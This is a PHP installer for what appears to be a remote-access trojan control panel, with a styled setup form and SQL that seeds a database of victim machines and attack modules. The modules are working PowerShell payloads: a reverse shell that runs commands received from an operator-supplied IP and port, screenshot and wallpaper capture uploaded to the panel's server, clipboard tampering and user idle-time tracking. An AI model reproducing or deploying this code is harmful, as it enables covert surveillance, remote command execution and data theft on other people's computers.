<?php
session_start();
if (isset($_POST['btn'])) {

    if (isset($_POST['db_name']) and !empty($_POST['db_name']) and isset($_POST['db_username']) and !empty($_POST['db_username']) and isset($_POST['db_password']) and isset($_POST['panel_username']) and !empty($_POST['panel_username']) and isset($_POST['panel_password']) and !empty($_POST['panel_password']) and isset($_POST['panel_password_repeat']) and !empty($_POST['panel_password_repeat'])) {
        $db_name = trim(htmlspecialchars($_POST['db_name']));
        $db_username = trim(htmlspecialchars($_POST['db_username']));
        $db_password = trim(htmlspecialchars($_POST['db_password']));
        $panel_username = trim(htmlspecialchars($_POST['panel_username']));
        $panel_password = password_hash(trim(htmlspecialchars($_POST['panel_password'])), PASSWORD_BCRYPT);
        $panel_password_repeat = trim(htmlspecialchars($_POST['panel_password_repeat']));
        if ($_POST['panel_password'] === $panel_password_repeat) {
            if(isset($_SERVER['HTTP_X_FORWARDED_PROTO'])){
$REQUEST_SCHEME="https";
}else{
$REQUEST_SCHEME="http";
}

                       $server_address = "$REQUEST_SCHEME://" . $_SERVER['HTTP_HOST']. "/" ;
            $dsn = "mysql:host=localhost;dbname=$db_name";
            try {
                $connection = new PDO($dsn, $db_username, $db_password);
                $connection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                $sql = $connection->prepare("

            CREATE TABLE `command` (
              `id` int(11) NOT NULL,
              `cmd` LONGTEXT  DEFAULT NULL,
              `result` LONGTEXT  DEFAULT NULL,
              `uuid` varchar(255) DEFAULT NULL,
              `cmd_uid` varchar(255) DEFAULT NULL,
              `time` datetime DEFAULT current_timestamp(),
              `status` int(11) DEFAULT 0
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
            CREATE TABLE `event` (
              `init` text NOT NULL,
              `up` text NOT NULL,
              `destroy` text NOT NULL
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
            CREATE TABLE `module` (
              `id` int(11) NOT NULL,
              `name` varchar(255) NOT NULL,
              `code` text NOT NULL,
              `args` int(11) NOT NULL,
              `place_holder` varchar(255) NOT NULL,
              `type` int(11) NOT NULL DEFAULT 1
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
            CREATE TABLE `admin` (
                `username` varchar(255) NOT NULL,
                `password` varchar(255) NOT NULL
              ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
            INSERT INTO `module` (`id`, `name`, `code`, `args`, `place_holder`, `type`) VALUES
            (3, 'IP', '\$ip = Invoke-RestMethod https://ident.me\nreturn  \$ip', 0, '', 1),
            (4, 'IdleTime', 'Add-Type @\"\r\nusing System;\r\nusing System.Diagnostics;\r\nusing System.Runtime.InteropServices;\r\n\r\nnamespace PInvoke.Win32 {\r\n\r\n    public static class UserInput {\r\n\r\n        [DllImport(\"user32.dll\", SetLastError=false)]\r\n        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);\r\n\r\n        [StructLayout(LayoutKind.Sequential)]\r\n        private struct LASTINPUTINFO {\r\n            public uint cbSize;\r\n            public int dwTime;\r\n        }\r\n\r\n        public static DateTime LastInput {\r\n            get {\r\n                DateTime bootTime = DateTime.UtcNow.AddMilliseconds(-Environment.TickCount);\r\n                DateTime lastInput = bootTime.AddMilliseconds(LastInputTicks);\r\n                return lastInput;\r\n            }\r\n        }\r\n\r\n        public static TimeSpan IdleTime {\r\n            get {\r\n                return DateTime.UtcNow.Subtract(LastInput);\r\n            }\r\n        }\r\n\r\n        public static int LastInputTicks {\r\n            get {\r\n                LASTINPUTINFO lii = new LASTINPUTINFO();\r\n                lii.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));\r\n                GetLastInputInfo(ref lii);\r\n                return lii.dwTime;\r\n            }\r\n        }\r\n    }\r\n}\r\n\"@\r\n            return (\"Idle for \" + [PInvoke.Win32.UserInput]::IdleTime)', 0, '', 1),
            (5, 'LastInput', 'Add-Type @\"\r\nusing System;\r\nusing System.Diagnostics;\r\nusing System.Runtime.InteropServices;\r\n\r\nnamespace PInvoke.Win32 {\r\n\r\n    public static class UserInput {\r\n\r\n        [DllImport(\"user32.dll\", SetLastError=false)]\r\n        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);\r\n\r\n        [StructLayout(LayoutKind.Sequential)]\r\n        private struct LASTINPUTINFO {\r\n            public uint cbSize;\r\n            public int dwTime;\r\n        }\r\n\r\n        public static DateTime LastInput {\r\n            get {\r\n                DateTime bootTime = DateTime.UtcNow.AddMilliseconds(-Environment.TickCount);\r\n                DateTime lastInput = bootTime.AddMilliseconds(LastInputTicks);\r\n                return lastInput;\r\n            }\r\n        }\r\n\r\n        public static TimeSpan IdleTime {\r\n            get {\r\n                return DateTime.UtcNow.Subtract(LastInput);\r\n            }\r\n        }\r\n\r\n        public static int LastInputTicks {\r\n            get {\r\n                LASTINPUTINFO lii = new LASTINPUTINFO();\r\n                lii.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));\r\n                GetLastInputInfo(ref lii);\r\n                return lii.dwTime;\r\n            }\r\n        }\r\n    }\r\n}\r\n\"@\r\nreturn (\"Last input \" + [PInvoke.Win32.UserInput]::LastInput)', 0, '', 1),
            (7, 'MessageBox', 'Add-Type -AssemblyName Microsoft.VisualBasic\n               [Microsoft.VisualBasic.Interaction]::MsgBox(\'\$a2\',\'OKOnly,SystemModal,Information\', \"\$a1\")', 2, 'title,messages', 1),
            (8, 'SetClipboard', '    Set-Clipboard \'\$a1\'\r\n        return  \'OK\'', 1, 'data', 1),
            (63, 'Download', 'return \"Download\"', 1, 'PATH d:\\file.txt', 1),
            (64, 'Upload', 'return \"Upload\"', 2, 'PATH d:\\,LINK', 1),
            (65, 'ScreenShot', '\$Path = \"C:\\\\temp\\\\\"\n\$UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID\n\n# Make sure that the directory to keep screenshots has been created, otherwise create it\nIf (!(test-path \$path)) {\n    New-Item -ItemType Directory -Force -Path \$path\n}\nAdd-Type -AssemblyName System.Windows.Forms\n\$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds\n# Get the current screen resolution\n\$image = New-Object System.Drawing.Bitmap(\$screen.Width, \$screen.Height)\n# Create a graphic object\n\$graphic = [System.Drawing.Graphics]::FromImage(\$image)\n\$point = New-Object System.Drawing.Point(0, 0)\n\$graphic.CopyFromScreen(\$point, \$point, \$image.Size);\n\$cursorBounds = New-Object System.Drawing.Rectangle([System.Windows.Forms.Cursor]::Position, [System.Windows.Forms.Cursor]::Current.Size)\n# Get a screenshot\n[System.Windows.Forms.Cursors]::Default.Draw(\$graphic, \$cursorBounds)\n\$user=  \$env:computername + \"-\" +\$env:username + \"-\" + \"\$((get-date).tostring(\'yyyy.MM.dd-HH.mm.ss\')).png\"\n\$screen_file = \"\$Path\\\" + \$UID + \"_\" + \$user\n# Save the screenshot as a PNG file\n\$image.Save(\$screen_file, [System.Drawing.Imaging.ImageFormat]::Png)\n\$wc = New-Object System.Net.WebClient\n\$resp = \$wc.UploadFile(\"$server_address\", \$screen_file)\nRemove-Item -Path \$screen_file -Force\nreturn \$user', 0, '', 1),
            (66, 'download_wallpaper', '\$UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID\n        \$user=\$UID+\"_\"+\"wallpaper\"\n        \$folder = Test-Path -Path C:\\\\temp\n        if (!\$folder) {\n            New-Item -Path C:\\\\ -Name temp -ItemType Directory\n    \n        }\n        \$BACKGROUND = (Get-ItemProperty \"hkcu:\\control panel\\\\desktop\\\" -Name Wallpaper).Wallpaper\n        Copy-Item \$BACKGROUND  C:\\\\temp\\\\\$user.jpg\n        \$wc = New-Object System.Net.WebClient\n        \$resp = \$wc.UploadFile(\"$server_address\", \"C:\\\\temp\\\\\$user.jpg\")\n        Remove-Item -Path C:\\\\temp\\\\\$user.jpg -Force\n        return \"OK\"', 0, '$server_address', 1),
            (75, 'test', 'return \'\$random\'', 0, '', 1),
            (98, '\'\$random\'', 'echo md5(rand());', 0, '', 2),
            (100, 'ReverseShell', '\$shell = { do { Start-Sleep -Seconds 1; try { \$TCPClient = New-Object Net.Sockets.TCPClient(\'\$a1\', \'\$a2\') } catch {} } until (\$TCPClient.Connected); \$NetworkStream = \$TCPClient.GetStream(); \$StreamWriter = New-Object IO.StreamWriter(\$NetworkStream); function WriteToStream (\$String) { [byte[]]\$script:Buffer = 0..\$TCPClient.ReceiveBufferSize | % { 0 }; \$StreamWriter.Write(\$String + \'ReHTTP :  \'); \$StreamWriter.Flush() }; WriteToStream \'\'; while ((\$BytesRead = \$NetworkStream.Read(\$Buffer, 0, \$Buffer.Length)) -gt 0) { \$Command = ([text.encoding]::UTF8).GetString(\$Buffer, 0, \$BytesRead - 1); \$Output = try { Invoke-Expression \$Command 2>&1 | Out-String } catch { \$_ | Out-String }; WriteToStream (\$Output) }; \$StreamWriter.Close() }\nStart-Job  \$shell', 2, 'IP,PORT', 1);

            CREATE TABLE `users` (
              `id` int(11) NOT NULL,
              `uuid` varchar(255) NOT NULL,
              `ip` varchar(255) NOT NULL,
              `info` text NOT NULL,
              `label` varchar(50) NOT NULL,
              `status` int(11) NOT NULL DEFAULT 0,
              `f_connection` datetime NOT NULL DEFAULT current_timestamp(),
              `l_connection` datetime DEFAULT NULL
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
            ALTER TABLE `command`
              ADD PRIMARY KEY (`id`);
            ALTER TABLE `module`
              ADD PRIMARY KEY (`id`),
              ADD UNIQUE KEY `name` (`name`);
            ALTER TABLE `users`
              ADD PRIMARY KEY (`id`),
              ADD UNIQUE KEY `uuid` (`uuid`);
            ALTER TABLE `command`
              MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2096;
            ALTER TABLE `module`
              MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=100;
            ALTER TABLE `users`
              MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=121;
              INSERT INTO `event` (`init`, `up`, `destroy`) VALUES
              ('# Download Main Wallpaper     \n \$UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID\n        \$user=\$UID+\"_\"+\"wallpaper\"\n        \$folder = Test-Path -Path C:\\\\temp\n        if (!\$folder) {\n            New-Item -Path C:\\\\ -Name temp -ItemType Directory\n    \n        }\n        \$BACKGROUND = (Get-ItemProperty \"hkcu:\\control panel\\\\desktop\\\" -Name Wallpaper).Wallpaper\n        Copy-Item \$BACKGROUND  C:\\\\temp\\\\\$user.jpg\n        \$wc = New-Object System.Net.WebClient\n        \$resp = \$wc.UploadFile(\" $server_address\", \"C:\\\\temp\\\\\$user.jpg\")\n        Remove-Item -Path C:\\\\temp\\\\\$user.jpg -Force\n      # Beep Sound For Test\n      # [console]::beep(200,5000)\n      # Put Custom Code Here\n return \"OK\"\n\n', '#[console]::beep(100,3000)', '[console]::beep(800,5000)');
                  INSERT INTO `admin` (`username`, `password`) VALUES ('$panel_username','$panel_password');
            COMMIT;

");
                $sql->execute();
                mkdir("users");
                $template = "
                <?php
                 error_reporting(0);
                \$dsn = 'mysql:host=localhost;dbname=$db_name';
                \$username = '$db_username';
                \$password = '$db_password';
                try {
                    \$connection = new PDO(\$dsn, \$username, \$password);
                    \$connection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                } catch (PDOException \$msg) {
                    echo 'Error ' . \$msg->getMessage();
                }
                ";
                file_put_contents("config/db.php", $template);
                header("location:index.php");
            } catch (PDOException $msg) {
                header("location:?error=Database Error ):");
            }
        } else {
            header("location:?error=Password Repeat Not Same ):");
        }
    } else {
        header("location:?error=Some Input Not Set ):");
    }
}

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Setup Database</title>
    <style>
        @font-face {
            font-family: 'Source Sans Pro';
            font-style: normal;
            font-weight: 200;
            src: url(https://fonts.gstatic.com/s/sourcesanspro/v21/6xKydSBYKcSV-LCoeQqfX1RYOo3i94_wlxdr.ttf) format('truetype');
        }

        @font-face {
            font-family: 'Source Sans Pro';
            font-style: normal;
            font-weight: 300;
            src: url(https://fonts.gstatic.com/s/sourcesanspro/v21/6xKydSBYKcSV-LCoeQqfX1RYOo3ik4zwlxdr.ttf) format('truetype');
        }

        * {
            margin: 0;
            padding: 0;
            font-weight: 300;
        }

        body {
            font-family: 'Source Sans Pro', sans-serif;
            color: white;
            font-weight: 300;
        }

        body ::-webkit-input-placeholder {
            /* WebKit browsers */
            font-family: 'Source Sans Pro', sans-serif;
            color: white;
            font-weight: 300;
        }

        body :-moz-placeholder {
            /* Mozilla Firefox 4 to 18 */
            font-family: 'Source Sans Pro', sans-serif;
            color: white;
            opacity: 1;
            font-weight: 300;
        }

        body ::-moz-placeholder {
            /* Mozilla Firefox 19+ */
            font-family: 'Source Sans Pro', sans-serif;
            color: white;
            opacity: 1;
            font-weight: 300;
        }

        body :-ms-input-placeholder {
            /* Internet Explorer 10+ */
            font-family: 'Source Sans Pro', sans-serif;
            color: white;
            font-weight: 300;
        }

        .wrapper {
            background: #50a3a2;
            background: linear-gradient(to bottom right, #50a3a2 0%, #53e3a6 100%);
            position: absolute;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }

        .wrapper.form-success .container h1 {
            transform: translateY(85px);
        }

        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 80px 0;
            height: 400px;
            text-align: center;
        }

        .container h1 {
            font-size: 40px;
            transition-duration: 1s;
            transition-timing-function: ease-in-put;
            font-weight: 200;
        }

        form {
            padding: 20px 0;
            position: relative;
            z-index: 2;
        }

        form input {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            outline: 0;
            border: 1px solid rgba(255, 255, 255, 0.4);
            background-color: rgba(255, 255, 255, 0.2);
            width: 250px;
            border-radius: 3px;
            padding: 10px 15px;
            margin: 0 auto 10px auto;
            display: block;
            text-align: center;
            font-size: 18px;
            color: white;
            transition-duration: 0.25s;
            font-weight: 300;
        }

        form input:hover {
            background-color: rgba(255, 255, 255, 0.4);
        }

        form input:focus {
            background-color: white;
            width: 300px;
            color: #53e3a6;
        }

        form button {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            outline: 0;
            background-color: white;
            border: 0;
            padding: 10px 15px;
            color: #53e3a6;
            border-radius: 3px;
            width: 250px;
            cursor: pointer;
            font-size: 18px;
            transition-duration: 0.25s;
        }

        form button:hover {
            background-color: #f5f7f9;
        }

        .bg-bubbles {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }

        .bg-bubbles li {
            position: absolute;
            list-style: none;
            display: block;
            width: 40px;
            height: 40px;
            background-color: rgba(255, 255, 255, 0.15);
            bottom: -160px;
            -webkit-animation: square 25s infinite;
            animation: square 25s infinite;
            transition-timing-function: linear;
        }

        .bg-bubbles li:nth-child(1) {
            left: 10%;
        }

        .bg-bubbles li:nth-child(2) {
            left: 20%;
            width: 80px;
            height: 80px;
            -webkit-animation-delay: 1s;
            animation-delay: 1s;
            -webkit-animation-duration: 17s;
            animation-duration: 17s;
        }

        .bg-bubbles li:nth-child(3) {
            left: 25%;
            -webkit-animation-delay: 4s;
            animation-delay: 4s;
        }

        .bg-bubbles li:nth-child(4) {
            left: 40%;
            width: 60px;
            height: 60px;
            -webkit-animation-duration: 21s;
            animation-duration: 21s;
            background-color: rgba(255, 255, 255, 0.25);
        }

        .bg-bubbles li:nth-child(5) {
            left: 70%;
        }

        .bg-bubbles li:nth-child(6) {
            left: 80%;
            width: 120px;
            height: 120px;
            -webkit-animation-delay: 3s;
            animation-delay: 3s;
            background-color: rgba(255, 255, 255, 0.2);
        }

        .bg-bubbles li:nth-child(7) {
            left: 32%;
            width: 160px;
            height: 160px;
            -webkit-animation-delay: 7s;
            animation-delay: 7s;
        }

        .bg-bubbles li:nth-child(8) {
            left: 55%;
            width: 20px;
            height: 20px;
            -webkit-animation-delay: 15s;
            animation-delay: 15s;
            -webkit-animation-duration: 40s;
            animation-duration: 40s;
        }

        .bg-bubbles li:nth-child(9) {
            left: 25%;
            width: 10px;
            height: 10px;
            -webkit-animation-delay: 1s;
            animation-delay: 1s;
            -webkit-animation-duration: 40s;
            animation-duration: 40s;
            background-color: rgba(255, 255, 255, 0.3);
        }

        .bg-bubbles li:nth-child(10) {
            left: 90%;
            width: 160px;
            height: 160px;
            -webkit-animation-delay: 11s;
            animation-delay: 11s;
        }

        @-webkit-keyframes square {
            0% {
                transform: translateY(0);
            }

            100% {
                transform: translateY(-700px) rotate(600deg);
            }
        }

        @keyframes square {
            0% {
                transform: translateY(0);
            }

            100% {
                transform: translateY(-700px) rotate(600deg);
            }
        }
    </style>
</head>

<body>
    <div class="wrapper">
        <div class="container">
            <h1>Setup Database</h1>

            <form class="form" method="POST">
                <input type="text" placeholder="Database Name" name="db_name" autocomplete="off">
                <input type="text" placeholder="Database Username" name="db_username" autocomplete="off">
                <input type="text" placeholder="Database Password" name="db_password" autocomplete="off">
                <input type="text" placeholder="Panel Username" name="panel_username" autocomplete="off">
                <input type="text" placeholder="Panel Password" name="panel_password" autocomplete="off">
                <input type="text" placeholder="Panel Repeat Password" name="panel_password_repeat" autocomplete="off">
                <button type="submit" name="btn">Connect</button>
            </form>

            <?php
            if (isset($_GET['error'])) {


                echo '<b style="color:red">' . trim(htmlspecialchars($_GET['error'])) . '</b>';
            }

            ?>
        </div>

        <ul class="bg-bubbles">
            <li></li>
            <li></li>
            <li></li>
            <li></li>
            <li></li>
            <li></li>
            <li></li>
            <li></li>
            <li></li>
            <li></li>

        </ul>
    </div>
</body>

</html>
